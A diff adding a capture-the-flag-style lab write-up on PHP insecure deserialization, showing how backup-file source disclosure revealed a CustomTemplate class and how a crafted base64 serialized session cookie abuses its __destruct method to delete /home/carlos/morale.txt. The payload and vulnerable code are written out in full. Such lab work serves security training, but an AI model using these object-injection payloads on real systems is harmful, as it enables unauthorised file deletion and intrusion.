@@ -1,0 +1,76 @@
+This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. 
+To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. 
+You will need to obtain source code access to solve this lab.
+
+
+looking at the site map directories the following file was available:
+GET /libs/CustomTemplate.php HTTP/2
+
+this file initially when viewing it was blank, however appending the ~ character to end the of the .php made the entire file visable.
+
+this gave the source code for the php file.
+
+in this file was an interesting magic method called __destruct(), which unlinked(deleted) the file path of the lock_file_path.
+
+
+the lab cookie comtained this vulnerable cookie:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlazh0bjdzODFsYWc0ODVza3Z1ZHhtMWk2dXpuZ3NqcyI7fQ%3d%3d
+
+which decodes to:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ek8tn7s81lag485skvudxm1i6uzngsjs";}
+
+
+however this would need to be drastically changed to exploit the .php file source code as this cookie was 
+creating a "User" object and we needed a "CustomTemplate" object.
+
+therefore using the following payload through the session cookie:
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQo=
+
+this is decoded to:
+O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+
+
+this object is of type CustomTemplate and provides two variables. The lock_file_path variable is deleted when the __destruct() method is called.
+
+
+
+this is the CustomTemplate.php code:
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+
+?>
